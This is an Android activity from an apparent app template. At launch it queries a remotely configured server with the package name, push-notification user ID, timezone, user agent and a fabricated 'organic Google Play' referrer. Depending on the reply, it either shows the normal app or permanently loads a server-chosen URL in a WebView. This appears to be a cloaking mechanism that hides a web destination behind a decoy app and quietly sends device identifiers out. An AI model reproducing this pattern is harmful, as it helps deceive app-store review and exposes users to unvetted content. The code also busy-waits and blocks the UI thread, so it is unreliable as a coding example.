package com.template;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebView;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.FirebaseApp;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.Charset;
import java.util.TimeZone;
import java.util.concurrent.ExecutionException;

public class MyInitialActivity extends AppCompatActivity {

    String uuid;
    FirebaseRemoteConfig firebaseRemoteConfig;
    private static final String ONESIGNAL_APP_ID = "f9db4054-450c-4628-ab97-f6680d1e9d0d";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.d("Launch firebase","ok");
        //FireBase init
        FirebaseApp.initializeApp(this);
        firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings firebaseRemoteConfigSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(10)
                .build();
        firebaseRemoteConfig.setConfigSettingsAsync(firebaseRemoteConfigSettings);
        initFromDataBase();
        Log.d("OneSignal launch","ok");
        //OneSignal API init
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        uuid = OneSignal.getDeviceState().getUserId();

        AsyncGetTags agt = new AsyncGetTags();
        agt.start();
        while(agt.getStatus()){}
        String tag = agt.getResult();

        Log.d("Tages", tag+"");

        if(tag == null) {
            try {
                Log.d("Tages","First init");
                firstInit();
            } catch (IOException | ExecutionException | InterruptedException | JSONException e) {
                e.printStackTrace();
            }
            return;
        }
        if(tag.equals("Error")){
            openMain();
            return;
        }
        openWeb(tag);
    }

    private void firstInit() throws IOException, ExecutionException, InterruptedException, JSONException {
        //params for url
        String checkLink = firebaseRemoteConfig.getString("check_link");
        String packID = this.getPackageName();
        TimeZone tz = TimeZone.getDefault();
        Log.d("Timezone",tz.getID());
        String tail = "&getr=utm_source=google-play&utm_medium=organic";
        String url = checkLink+"/?packageid="+packID+"&usserid="+uuid+"&getz="+tz.getID()+tail;
        //Async
        Log.d("Tages",url);

        String userAgent = new WebView(this).getSettings().getUserAgentString();

        AsyncReq ar = new AsyncReq();
        ar.execute(url,userAgent);
        String response = ar.get();

        //Log.d()

        if(response.equals("error")){
            failInit();
        }else{
            successInit(response);
        }


    }

    private void successInit(String url) {
        OneSignal.sendTag("PRIMER_URL",url);
        openWeb(url);

    }
    private void failInit(){
        OneSignal.sendTag("PRIMER_URL","Error");
        openMain();
    }

    private void openMain(){
        Intent intent = new Intent();
        intent.setClass(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    private void openWeb(String url){
        Intent intent = new Intent();
        intent.putExtra("url",url);
        intent.setClass(this, WebActivity.class);
        startActivity(intent);
        finish();
    }

    private void initFromDataBase() {
        firebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, task -> {
                    if (task.isSuccessful()) {
                        Log.d("Firebases", "Okey");
                    } else {
                        Log.d("Firebases", "Massive comic errror");
                    }
                });
    }
}

class AsyncReq extends AsyncTask<String, Integer, String> {

    @Override
    protected String doInBackground(String... strings) {
        int statusCode = 403;
        try{
            URL url = new URL(strings[0]);
            HttpURLConnection http = (HttpURLConnection)url.openConnection();
            http.addRequestProperty("User-Agent",strings[1]);
            statusCode = http.getResponseCode();
            http.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Log.d("Tages",statusCode+"");
        if(statusCode == 200){
            try(InputStream is = new URL(strings[0]).openStream()) {
                BufferedReader rd = new BufferedReader(new InputStreamReader(is, Charset.forName("UTF-8")));
                String jsonText = readAll(rd);
                JSONObject json = new JSONObject(jsonText);
                String url = json.getString("url");
                return url;
            } catch (JSONException | IOException e) {
                e.printStackTrace();
            }
        }

        return "error";
    }
    private static String readAll(Reader rd) throws IOException {
        StringBuilder sb = new StringBuilder();
        int cp;
        while ((cp = rd.read()) != -1) {
            sb.append((char) cp);
        }
        return sb.toString();
    }
}

class AsyncGetTags extends Thread{

    private String result=null;
    private boolean status=true;

    @Override
    public void run() {
        OneSignal.getTags(new OneSignal.OSGetTagsHandler() {
            @Override
            public void tagsAvailable(JSONObject tags) {
                //tags can be null
                if (tags != null) {
                    setResult(tags);
                }else{
                    setResult(null);
                }
            }
        });
    }

    public boolean getStatus(){
        return this.status;
    }

    private void setResult(JSONObject result){
        if(result != null)
        try{
            this.result = result.getString("PRIMER_URL");
            Log.d("ThResultset", this.result+"1");
        } catch (JSONException e) {
        }
        status = false;
    }

    public String getResult(){
        Log.d("ThResultset", this.result+"2");
        return this.result;
    }

}